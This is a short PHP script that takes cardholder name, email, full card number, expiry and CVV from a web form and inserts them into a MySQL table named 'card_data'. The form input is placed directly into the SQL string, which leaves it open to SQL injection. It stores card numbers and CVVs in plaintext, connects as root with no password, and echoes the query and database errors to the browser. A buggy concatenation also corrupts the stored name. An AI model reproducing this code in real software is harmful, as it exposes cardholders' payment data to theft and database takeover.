<?php
    $package_name = $_POST['package_name'];
    $name_on_card = $_POST['name_on_card'];
    $email = $_POST['email'];
    $card_number = $_POST['card_number'];
    $expiration_date = $_POST['expiration_date'];
    $cvv = $_POST['cvv'];
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "trendmine";
    
    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    // Check connection
    if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
    }
    
    $sql = "INSERT INTO `card_data` (`id`, `name`, `email`, `card_number`, `card_expiry`, `card_cvv`, `package_name`, `capture_date`) VALUES (NULL, '.$name_on_card.', '$email', '$card_number', '$expiration_date', '$cvv' ,'$package_name', current_timestamp())";
    
    if ($conn->query($sql) === TRUE) {
      echo "New record created successfully";
    } else {
      echo "Error: " . $sql . "<br>" . $conn->error;
    }
    
    $conn->close();
    ?>